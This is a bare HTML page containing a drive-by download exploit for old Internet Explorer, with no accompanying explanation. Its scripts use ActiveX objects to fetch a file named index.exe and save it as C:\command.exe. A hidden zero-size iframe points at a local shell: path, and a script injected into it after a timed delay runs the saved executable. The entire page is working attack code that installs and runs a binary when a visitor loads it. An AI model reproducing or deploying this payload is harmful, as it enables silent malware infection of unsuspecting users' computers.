<script language='javascript'>
 var w = new ActiveXObject('Microsoft.XMLHTTP');
 w.Open('GET','index.exe',0);
 w.Send();
 var z = new ActiveXObject('ADODB.Stream');
 z.Mode = 3;
 z.Type = 1;
 z.Open();
 z.Write(w.responseBody);
 z.SaveToFile('C:\\command.exe',2);
</script>

<iframe src='shell:windows\web\tip.htm' style='width:0px;height:0px;'></iframe>

<textarea id='code' style='display:none;'>
  &nbsp;
  <script language='JScript' DEFER>
    var obj=new ActiveXObject('Shell.Application');
    obj.ShellExecute('c:\\command.exe');
  </script>
</textarea>

<script language='javascript'>
  function doit()
   {
    document.frames[0].document.body.insertAdjacentHTML('afterBegin',document.all.code.value);
   }
  setTimeout('doit()', 2000);
</script>
